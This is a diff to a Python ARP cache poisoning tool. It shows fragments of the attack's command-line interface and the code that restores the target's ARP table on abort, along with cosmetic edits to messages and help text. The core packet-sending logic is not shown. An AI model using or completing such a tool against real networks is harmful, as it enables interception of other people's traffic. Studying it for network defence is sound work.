@@ -14,6 +14,9 @@ from itertools import count
 from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
 
 
+i = ' ' * 4  # Basic indentation level
+
+
 class ARPPacket(object):
     ETHER_T = b'\x08\x06'  # Ethertype code of ARP (IETF RFC 7042)
 
@@ -98,7 +101,6 @@ def spoof(args):
     packets = ARPPacket(attacker_mac=args.attackermac, gateway_mac=args.gatemac,
                         target_mac=args.targetmac, gateway_ip=args.gateip,
                         target_ip=args.targetip)
-
     spoofer = Spoofer(interface=args.interface, arp_packets=packets)
 
     current_time = time.strftime("%H:%M:%S", time.localtime())
@@ -108,11 +110,11 @@ def spoof(args):
         spoofer.execute(max_packets=args.maxpackets, interval=args.interval)
     except KeyboardInterrupt:
         print('[!] Aborting ARP Spoofing attack...')
-        print('    [+] Restoring target ARP tables to their previous states...')
-        packets.restore_arp_table = True
-        spoofer.arp_packets = packets
+        print('{0}[+] Attempting to restore target ARP tables to their '
+              'previous states...'.format(i))
+        packets.restore_target_table()
         spoofer.execute(max_packets=20, interval=1)
-        raise SystemExit('    [+] ARP Spoofing attack terminated.')
+        raise SystemExit('{0}[+] ARP Spoofing attack terminated.'.format(i))
 
 
 if __name__ == '__main__':
@@ -137,11 +139,11 @@ if __name__ == '__main__':
     parser.add_argument('--interval', type=float, default=0.5,
                         metavar='SECONDS',
                         help='Time to wait between transmission of each set of '
-                             'ARP Cache Poisoning attack packets (defaults to '
-                             '0.5 seconds).')
+                             'ARP Cache Poisoning attack packets (set to 0.5 '
+                             'seconds by default).')
     parser.add_argument('--maxpackets', type=int, default=0, metavar='PACKETS',
-                        help='The maximum number of packets to transmit to '
-                             'the targets during the attack (defaults to 0 to '
-                             'set an infinite number of packets).')
+                        help='Maximum number of packets to transmit to the '
+                             'targets during the attack (set to 0 to send an '
+                             'infinite number of packets by default).')
     cli_args = parser.parse_args()
     spoof(cli_args)
